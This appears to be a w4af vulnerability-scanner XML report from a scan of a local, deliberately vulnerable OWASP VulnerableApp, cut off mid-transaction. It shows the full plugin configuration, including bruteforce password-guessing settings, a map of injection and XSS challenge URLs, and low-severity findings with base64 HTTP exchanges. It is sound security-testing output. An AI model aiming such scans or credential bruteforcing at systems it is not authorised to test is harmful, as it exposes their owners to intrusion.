<?xml version="1.0" encoding="utf-8"?>
<w4af-run start="1710954258" start-long="Wed Mar 20 13:04:18 2024" version="2.8">

    <w4af-version>w4af - Web Advanced Application Attack and Audit Framework
Version: pre-alpha release
Revision: dcc7eb189b - 29 Nov 2023 16:32
Branch: main
Local changes: No
Author: The w4af team.</w4af-version>

    <scan-info target="http://localhost/">
    <audit>
            <plugin name="xss">
                        <config parameter="persistent_xss" value="True"/>
            </plugin>
            <plugin name="format_string">
            </plugin>
            <plugin name="frontpage">
            </plugin>
            <plugin name="xpath">
            </plugin>
            <plugin name="mx_injection">
            </plugin>
            <plugin name="generic">
                        <config parameter="diff_ratio" value="0.35"/>
                        <config parameter="extensive" value="False"/>
            </plugin>
            <plugin name="htaccess_methods">
            </plugin>
            <plugin name="phishing_vector">
            </plugin>
            <plugin name="dav">
            </plugin>
            <plugin name="ssi">
            </plugin>
            <plugin name="lfi">
            </plugin>
            <plugin name="ssl_certificate">
                        <config parameter="min_expire_days" value="30"/>
                        <config parameter="ca_file_name" value="w4af/plugins/audit/ssl_certificate/ca.pem"/>
            </plugin>
            <plugin name="response_splitting">
            </plugin>
            <plugin name="un_ssl">
            </plugin>
            <plugin name="ldapi">
            </plugin>
            <plugin name="buffer_overflow">
            </plugin>
            <plugin name="global_redirect">
            </plugin>
            <plugin name="sqli">
            </plugin>
            <plugin name="csrf">
            </plugin>
            <plugin name="preg_replace">
            </plugin>
            <plugin name="eval">
                        <config parameter="use_time_delay" value="True"/>
                        <config parameter="use_echo" value="True"/>
            </plugin>
            <plugin name="xst">
            </plugin>
            <plugin name="redos">
            </plugin>
            <plugin name="blind_sqli">
                        <config parameter="eq_limit" value="0.9"/>
            </plugin>
            <plugin name="rfi">
                        <config parameter="listen_address" value=""/>
                        <config parameter="listen_port" value="44449"/>
                        <config parameter="use_w4af_site" value="True"/>
            </plugin>
            <plugin name="file_upload">
                        <config parameter="extensions" value="gif,html"/>
            </plugin>
            <plugin name="os_commanding">
            </plugin>
    </audit>
    <grep>
            <plugin name="blank_body">
            </plugin>
            <plugin name="dom_xss">
            </plugin>
            <plugin name="hash_analysis">
            </plugin>
            <plugin name="click_jacking">
            </plugin>
            <plugin name="get_emails">
                        <config parameter="only_target_domain" value="True"/>
            </plugin>
            <plugin name="feeds">
            </plugin>
            <plugin name="strange_parameters">
            </plugin>
            <plugin name="ssn">
            </plugin>
            <plugin name="strange_headers">
            </plugin>
            <plugin name="http_in_body">
            </plugin>
            <plugin name="svn_users">
            </plugin>
            <plugin name="lang">
            </plugin>
            <plugin name="strange_http_codes">
            </plugin>
            <plugin name="oracle">
            </plugin>
            <plugin name="credit_cards">
            </plugin>
            <plugin name="meta_tags">
            </plugin>
            <plugin name="form_autocomplete">
            </plugin>
            <plugin name="dot_net_event_validation">
            </plugin>
            <plugin name="wsdl_greper">
            </plugin>
            <plugin name="http_auth_detect">
            </plugin>
            <plugin name="user_defined_regex">
                        <config parameter="single_regex" value=""/>
                        <config parameter="regex_file_path" value="w4af/plugins/grep/user_defined_regex/empty.txt"/>
            </plugin>
            <plugin name="password_profiling">
            </plugin>
            <plugin name="symfony">
                        <config parameter="override" value="False"/>
            </plugin>
            <plugin name="error_pages">
            </plugin>
            <plugin name="objects">
            </plugin>
            <plugin name="motw">
            </plugin>
            <plugin name="code_disclosure">
            </plugin>
            <plugin name="error_500">
            </plugin>
            <plugin name="private_ip">
            </plugin>
            <plugin name="html_comments">
            </plugin>
            <plugin name="directory_indexing">
            </plugin>
            <plugin name="path_disclosure">
            </plugin>
            <plugin name="file_upload">
            </plugin>
            <plugin name="analyze_cookies">
            </plugin>
            <plugin name="strange_reason">
            </plugin>
    </grep>
    <bruteforce>
            <plugin name="basic_auth">
                        <config parameter="users_file" value="w4af/core/controllers/bruteforce/users.txt"/>
                        <config parameter="passwd_file" value="w4af/core/controllers/bruteforce/passwords.txt"/>
                        <config parameter="use_svn_users" value="True"/>
                        <config parameter="stop_on_first" value="True"/>
                        <config parameter="pass_eq_user" value="True"/>
                        <config parameter="use_leet_password" value="True"/>
                        <config parameter="use_emails" value="True"/>
                        <config parameter="use_profiling" value="True"/>
                        <config parameter="profiling_number" value="50"/>
                        <config parameter="mask_password_report" value="False"/>
                        <config parameter="combo_file" value=""/>
                        <config parameter="combo_separator" value=":"/>
            </plugin>
            <plugin name="form_auth">
                        <config parameter="users_file" value="w4af/core/controllers/bruteforce/users.txt"/>
                        <config parameter="passwd_file" value="w4af/core/controllers/bruteforce/passwords.txt"/>
                        <config parameter="use_svn_users" value="True"/>
                        <config parameter="stop_on_first" value="True"/>
                        <config parameter="pass_eq_user" value="True"/>
                        <config parameter="use_leet_password" value="True"/>
                        <config parameter="use_emails" value="True"/>
                        <config parameter="use_profiling" value="True"/>
                        <config parameter="profiling_number" value="50"/>
                        <config parameter="mask_password_report" value="False"/>
                        <config parameter="combo_file" value="w4af/core/controllers/bruteforce/combo.txt"/>
                        <config parameter="combo_separator" value=":"/>
            </plugin>
    </bruteforce>
    <crawl>
            <plugin name="spider_man">
                        <config parameter="listen_address" value="127.0.0.1"/>
                        <config parameter="listen_port" value="44444"/>
            </plugin>
    </crawl>
    <evasion>
    </evasion>
    <mangle>
    </mangle>
    <output>
            <plugin name="xml_file">
            </plugin>
            <plugin name="text_file">
            </plugin>
            <plugin name="html_file">
            </plugin>
            <plugin name="console">
                        <config parameter="verbose" value="False"/>
                        <config parameter="use_colors" value="True"/>
            </plugin>
            <plugin name="json_file">
            </plugin>
    </output>
    <auth>
    </auth>
    <infrastructure>
            <plugin name="frontpage_version">
            </plugin>
            <plugin name="allowed_methods">
            </plugin>
            <plugin name="server_header">
            </plugin>
    </infrastructure>
</scan-info>

    <scan-status>
    <status>Running</status>
    <is-paused>False</is-paused>
    <is-running>True</is-running>

    <active-plugin>
        <crawl>server_header</crawl>
        <audit>os_commanding</audit>
    </active-plugin>

    <current-request>
        <crawl>GET http://localhost/VulnerableApp/XXEVulnerability/LEVEL_4</crawl>
        <audit>GET http://localhost/VulnerableApp/XXEVulnerability/LEVEL_4</audit>
    </current-request>

    <queues>
        <crawl>
            <input-speed>0</input-speed>
            <output-speed>0</output-speed>
            <length>0</length>
            <processed-tasks>0</processed-tasks>
        </crawl>

        <audit>
            <input-speed>0</input-speed>
            <output-speed>0</output-speed>
            <length>0</length>
            <processed-tasks>0</processed-tasks>
        </audit>

        <grep>
            <input-speed>0</input-speed>
            <output-speed>0</output-speed>
            <length>0</length>
            <processed-tasks>None</processed-tasks>
        </grep>
    </queues>

    <eta>
        <crawl>0 seconds</crawl>
        <audit>0 seconds</audit>
        <grep>0 seconds</grep>
        <all>0 seconds</all>
    </eta>

    <rpm>130</rpm>
    <sent-request-count>17421</sent-request-count>
    <progress>100</progress>

    <total-urls>122</total-urls>
    <known-urls>    
    <node url="http://localhost" exists="1">
                                        
        <node url="VulnerabilityDefinitions%0A" exists="1" />        
        <node url="VulnerableApp" exists="0">
                            
            <node url="BlindSQLInjectionVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />
                            
            </node>                            
            <node url="BlindSQLInjectionVulnerability%0A" exists="1" />            
            <node url="CommandInjection" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_6" exists="1" />
                            
            </node>                            
            <node url="CommandInjection%0A" exists="1" />            
            <node url="ErrorBasedSQLInjectionVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />
                            
            </node>                            
            <node url="ErrorBasedSQLInjectionVulnerability%0A" exists="1" />            
            <node url="Http3xxStatusCodeBasedInjection" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_7" exists="1" />                                
                <node url="LEVEL_8" exists="1" />
                            
            </node>                            
            <node url="Http3xxStatusCodeBasedInjection%0A" exists="1" />            
            <node url="JWTVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_1%0A" exists="1" />                                
                <node url="LEVEL_10" exists="1" />                                
                <node url="LEVEL_10%0A" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_2%0A" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_3%0A" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_4%0A" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_5%0A" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_6%0A" exists="1" />                                
                <node url="LEVEL_7" exists="1" />                                
                <node url="LEVEL_7%0A" exists="1" />                                
                <node url="LEVEL_8" exists="1" />                                
                <node url="LEVEL_8%0A" exists="1" />                                
                <node url="LEVEL_9" exists="1" />                                
                <node url="LEVEL_9%0A" exists="1" />
                            
            </node>                            
            <node url="JWTVulnerability%0A" exists="1" />            
            <node url="PathTraversal" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_10" exists="1" />                                
                <node url="LEVEL_11" exists="1" />                                
                <node url="LEVEL_12" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_7" exists="1" />                                
                <node url="LEVEL_8" exists="1" />                                
                <node url="LEVEL_9" exists="1" />
                            
            </node>                            
            <node url="PathTraversal%0A" exists="1" />            
            <node url="PersistentXSSInHTMLTagVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_1%0A" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_2%0A" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_3%0A" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_4%0A" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_5%0A" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_6%0A" exists="1" />                                
                <node url="LEVEL_7" exists="1" />                                
                <node url="LEVEL_7%0A" exists="1" />
                            
            </node>                            
            <node url="PersistentXSSInHTMLTagVulnerability%0A" exists="1" />            
            <node url="SSRFVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />
                            
            </node>                            
            <node url="SSRFVulnerability%0A" exists="1" />            
            <node url="UnionBasedSQLInjectionVulnerability" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_7" exists="1" />                                
                <node url="LEVEL_8" exists="1" />                                
                <node url="LEVEL_9" exists="1" />
                            
            </node>                            
            <node url="UnionBasedSQLInjectionVulnerability%0A" exists="1" />            
            <node url="UnrestrictedFileUpload" exists="0">
                                                
                <node url="LEVEL_1%0A" exists="1" />                                
                <node url="LEVEL_10%0A" exists="1" />                                
                <node url="LEVEL_2%0A" exists="1" />                                
                <node url="LEVEL_3%0A" exists="1" />                                
                <node url="LEVEL_4%0A" exists="1" />                                
                <node url="LEVEL_5%0A" exists="1" />                                
                <node url="LEVEL_6%0A" exists="1" />                                
                <node url="LEVEL_7%0A" exists="1" />                                
                <node url="LEVEL_8%0A" exists="1" />                                
                <node url="LEVEL_9%0A" exists="1" />
                            
            </node>                            
            <node url="UnrestrictedFileUpload%0A" exists="1" />            
            <node url="XSSInImgTagAttribute" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />                                
                <node url="LEVEL_4" exists="1" />                                
                <node url="LEVEL_5" exists="1" />                                
                <node url="LEVEL_6" exists="1" />                                
                <node url="LEVEL_7" exists="1" />
                            
            </node>                            
            <node url="XSSInImgTagAttribute%0A" exists="1" />            
            <node url="XSSWithHtmlTagInjection" exists="0">
                                                
                <node url="LEVEL_1" exists="1" />                                
                <node url="LEVEL_2" exists="1" />                                
                <node url="LEVEL_3" exists="1" />
                            
            </node>                            
            <node url="XSSWithHtmlTagInjection%0A" exists="1" />            
            <node url="XXEVulnerability" exists="0">
                                                
                <node url="LEVEL_1%0A" exists="1" />                                
                <node url="LEVEL_2%0A" exists="1" />                                
                <node url="LEVEL_3%0A" exists="1" />                                
                <node url="LEVEL_4" exists="1" />
                            
            </node>                            
            <node url="XXEVulnerability%0A" exists="1" />
                        
        </node>                        
        <node url="VulnerableApp%0A" exists="1" />
                    
    </node>
    </known-urls>
</scan-status>

        <vulnerability id="[24]" method="GET" name="Server header" plugin="server_header" severity="Information" url="None" var="None">
    <description>The server header for the remote web server is: &quot;openresty/1.21.4.3&quot;.</description>


    <http-transactions>
            <http-transaction id="24">

    <http-request>
        <status>GET http://localhost/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200 OK</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:18 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="2398" />
            <header field="Last-Modified" content="Sun, 03 Dec 2023 20:44:36 GMT" />
            <header field="Connection" content="keep-alive" />
            <header field="ETag" content="&quot;656ce8b4-95e&quot;" />
            <header field="Accept-Ranges" content="bytes" />
        </headers>
        <body content-encoding="base64">PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ii8+PGxpbmsgcmVsPSJpY29uIiBocmVmPSIvZmF2aWNvbi5pY28iLz48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSIvPjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjMDAwMDAwIi8+PG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik93YXNwIFZ1bG5lcmFibGVBcHAgRmFjYWRlIi8+PGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSIvbG9nbzE5Mi5wbmciLz48bGluayByZWw9Im1hbmlmZXN0IiBocmVmPSIvbWFuaWZlc3QuanNvbiIvPjx0aXRsZT5WdWxuZXJhYmxlQXBwLUZhY2FkZTwvdGl0bGU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iR2xvYmFsVXRpbGl0eS5qcyI+PC9zY3JpcHQ+PGxpbmsgaHJlZj0iL3N0YXRpYy9jc3MvMi42ZDAyMjA0NS5jaHVuay5jc3MiIHJlbD0ic3R5bGVzaGVldCI+PGxpbmsgaHJlZj0iL3N0YXRpYy9jc3MvbWFpbi44MmUzOWQ5My5jaHVuay5jc3MiIHJlbD0ic3R5bGVzaGVldCI+PC9oZWFkPjxib2R5Pjxub3NjcmlwdD5Zb3UgbmVlZCB0byBlbmFibGUgSmF2YVNjcmlwdCB0byBydW4gdGhpcyBhcHAuPC9ub3NjcmlwdD48ZGl2IGlkPSJyb290Ij48L2Rpdj48ZGl2IGlkPSJzY3JpcHRzIj48L2Rpdj48ZGl2IGlkPSJzdHlsZXMiPjwvZGl2PjxzY3JpcHQ+IWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHIocil7Zm9yKHZhciBuLGEscD1yWzBdLGY9clsxXSxsPXJbMl0sYz0wLHM9W107YzxwLmxlbmd0aDtjKyspYT1wW2NdLE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbChvLGEpJiZvW2FdJiZzLnB1c2gob1thXVswXSksb1thXT0wO2ZvcihuIGluIGYpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGYsbikmJihlW25dPWZbbl0pO2ZvcihpJiZpKHIpO3MubGVuZ3RoOylzLnNoaWZ0KCkoKTtyZXR1cm4gdS5wdXNoLmFwcGx5KHUsbHx8W10pLHQoKX1mdW5jdGlvbiB0KCl7Zm9yKHZhciBlLHI9MDtyPHUubGVuZ3RoO3IrKyl7Zm9yKHZhciB0PXVbcl0sbj0hMCxwPTE7cDx0Lmxlbmd0aDtwKyspe3ZhciBmPXRbcF07MCE9PW9bZl0mJihuPSExKX1uJiYodS5zcGxpY2Uoci0tLDEpLGU9YShhLnM9dFswXSkpfXJldHVybiBlfXZhciBuPXt9LG89ezE6MH0sdT1bXTtmdW5jdGlvbiBhKHIpe2lmKG5bcl0pcmV0dXJuIG5bcl0uZXhwb3J0czt2YXIgdD1uW3JdPXtpOnIsbDohMSxleHBvcnRzOnt9fTtyZXR1cm4gZVtyXS5jYWxsKHQuZXhwb3J0cyx0LHQuZXhwb3J0cyxhKSx0Lmw9ITAsdC5leHBvcnRzfWEubT1lLGEuYz1uLGEuZD1mdW5jdGlvbihlLHIsdCl7YS5vKGUscil8fE9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLHIse2VudW1lcmFibGU6ITAsZ2V0OnR9KX0sYS5yPWZ1bmN0aW9uKGUpeyJ1bmRlZmluZWQiIT10eXBlb2YgU3ltYm9sJiZTeW1ib2wudG9TdHJpbmdUYWcmJk9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLFN5bWJvbC50b1N0cmluZ1RhZyx7dmFsdWU6Ik1vZHVsZSJ9KSxPYmplY3QuZGVmaW5lUHJvcGVydHkoZSwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSl9LGEudD1mdW5jdGlvbihlLHIpe2lmKDEmciYmKGU9YShlKSksOCZyKXJldHVybiBlO2lmKDQmciYmIm9iamVjdCI9PXR5cGVvZiBlJiZlJiZlLl9fZXNNb2R1bGUpcmV0dXJuIGU7dmFyIHQ9T2JqZWN0LmNyZWF0ZShudWxsKTtpZihhLnIodCksT2JqZWN0LmRlZmluZVByb3BlcnR5KHQsImRlZmF1bHQiLHtlbnVtZXJhYmxlOiEwLHZhbHVlOmV9KSwyJnImJiJzdHJpbmciIT10eXBlb2YgZSlmb3IodmFyIG4gaW4gZSlhLmQodCxuLGZ1bmN0aW9uKHIpe3JldHVybiBlW3JdfS5iaW5kKG51bGwsbikpO3JldHVybiB0fSxhLm49ZnVuY3Rpb24oZSl7dmFyIHI9ZSYmZS5fX2VzTW9kdWxlP2Z1bmN0aW9uKCl7cmV0dXJuIGUuZGVmYXVsdH06ZnVuY3Rpb24oKXtyZXR1cm4gZX07cmV0dXJuIGEuZChyLCJhIixyKSxyfSxhLm89ZnVuY3Rpb24oZSxyKXtyZXR1cm4gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUscil9LGEucD0iLyI7dmFyIHA9dGhpc1sid2VicGFja0pzb25wZmFjYWRlLWFwcCJdPXRoaXNbIndlYnBhY2tKc29ucGZhY2FkZS1hcHAiXXx8W10sZj1wLnB1c2guYmluZChwKTtwLnB1c2g9cixwPXAuc2xpY2UoKTtmb3IodmFyIGw9MDtsPHAubGVuZ3RoO2wrKylyKHBbbF0pO3ZhciBpPWY7dCgpfShbXSk8L3NjcmlwdD48c2NyaXB0IHNyYz0iL3N0YXRpYy9qcy8yLmM5NTM5ZTg1LmNodW5rLmpzIj48L3NjcmlwdD48c2NyaXB0IHNyYz0iL3N0YXRpYy9qcy9tYWluLmQyZGUxYjQyLmNodW5rLmpzIj48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[237, 229, 31]" method="GET" name="Strange HTTP response code" plugin="strange_http_codes" severity="Information" url="http://localhost/ycoCM" var="None">
    <description>The remote web server sent 3 HTTP responses with the uncommon response status code 405 using &quot;Not Allowed&quot; as message. The first ten URLs which sent the uncommon status code are:
 - http://localhost/VulnerableApp/
 - http://localhost/VulnerableApp/XXEVulnerability/LEVEL_4
 - http://localhost/ycoCM
</description>

    <long-description>The server responded with a strange HTTP status code. This is a non-issue
however exotic HTTP response status codes can provide useful insights
into the behavior of the web application and assist with the information
security analysis.</long-description>
    <fix-guidance>Manually inspect the HTTP response status code and body</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="RFC-2616" url="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" />
    </references>

    <http-transactions>
            <http-transaction id="237">

    <http-request>
        <status>PROPFIND http://localhost/VulnerableApp/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Content-type" content="application/xml; charset=&quot;utf-8&quot;" />
            <header field="Depth" content="1" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Content-length" content="107" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64">PD94bWwgdmVyc2lvbj0nMS4wJz8+DQo8YTpwcm9wZmluZCB4bWxuczphPSdEQVY6Jz4NCjxhOnByb3A+DQo8YTpkaXNwbGF5bmFtZTovPg0KPC9hOnByb3A+DQo8L2E6cHJvcGZpbmQ+DQo=</body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 405</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:34 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Allow" content="GET, HEAD" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA2OjM0Ljc5OCswMDowMCIsInN0YXR1cyI6NDA1LCJlcnJvciI6Ik1ldGhvZCBOb3QgQWxsb3dlZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="229">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XXEVulnerability/LEVEL_4 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 405</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:43 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Allow" content="POST" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="31">

    <http-request>
        <status>PUT http://localhost/ycoCM HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Content-type" content="text/plain" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Content-length" content="6" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64">UHE0djc2</body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 405 Not Allowed</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:19 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="163" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGh0bWw+DQo8aGVhZD48dGl0bGU+NDA1IE5vdCBBbGxvd2VkPC90aXRsZT48L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+PGgxPjQwNSBOb3QgQWxsb3dlZDwvaDE+PC9jZW50ZXI+DQo8aHI+PGNlbnRlcj5vcGVucmVzdHkvMS4yMS40LjM8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[25, 44, 62, 68]" method="GET" name="Allowed HTTP methods" plugin="allowed_methods" severity="Information" url="http://localhost/" var="None">
    <description>The URL &quot;http://localhost/&quot; has the following enabled HTTP methods: *, GET, HEAD</description>

    <long-description>There are a number of HTTP methods that can be used on a webserver
(`OPTIONS`, `HEAD`, `GET`, `POST`, `PUT`, `DELETE` etc.). Each of
these methods perform a different function and each have an associated
level of risk when their use is permitted on the webserver.

A client
can use the `OPTIONS` method within a request to query a server to
determine which methods are allowed.

Cyber-criminals will almost
always perform this simple test as it will give a very quick
indication of any high-risk methods being permitted by the server.
The tool discovered that several methods are supported by the server.</long-description>
    <fix-guidance>It is recommended that a whitelisting approach be taken to explicitly
permit the HTTP methods required by the application and block all
others.

Typically the only HTTP methods required for most
applications are `GET` and `POST`. All other methods perform actions
that are rarely required or perform actions that are inherently risky.
These risky methods (such as `PUT`, `DELETE`, etc) should be protected
by strict limitations, such as ensuring that the channel is secure
(SSL/TLS enabled) and only authorised and trusted clients are
permitted to use them.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="Apache.org" url="http://httpd.apache.org/docs/2.2/mod/core.html#limitexcept" />
    </references>

    <http-transactions>
            <http-transaction id="25">

    <http-request>
        <status>OPTIONS http://localhost/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 405 Not Allowed</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:19 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="163" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGh0bWw+DQo8aGVhZD48dGl0bGU+NDA1IE5vdCBBbGxvd2VkPC90aXRsZT48L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+PGgxPjQwNSBOb3QgQWxsb3dlZDwvaDE+PC9jZW50ZXI+DQo8aHI+PGNlbnRlcj5vcGVucmVzdHkvMS4yMS40LjM8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg==</body>
    </http-response>

</http-transaction>
            <http-transaction id="44">

    <http-request>
        <status>HEAD http://localhost/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200 OK</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:20 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="2398" />
            <header field="Last-Modified" content="Sun, 03 Dec 2023 20:44:36 GMT" />
            <header field="Connection" content="keep-alive" />
            <header field="ETag" content="&quot;656ce8b4-95e&quot;" />
            <header field="Accept-Ranges" content="bytes" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="62">

    <http-request>
        <status>* http://localhost/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 400 Bad Request</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:20 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="163" />
            <header field="Connection" content="close" />
        </headers>
        <body content-encoding="base64">PGh0bWw+DQo8aGVhZD48dGl0bGU+NDAwIEJhZCBSZXF1ZXN0PC90aXRsZT48L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+PGgxPjQwMCBCYWQgUmVxdWVzdDwvaDE+PC9jZW50ZXI+DQo8aHI+PGNlbnRlcj5vcGVucmVzdHkvMS4yMS40LjM8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg==</body>
    </http-response>

</http-transaction>
            <http-transaction id="68">

    <http-request>
        <status>GET http://localhost/ HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="w4af.net" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Host" content="localhost" />
            <header field="Accept" content="*/*" />
        </headers>
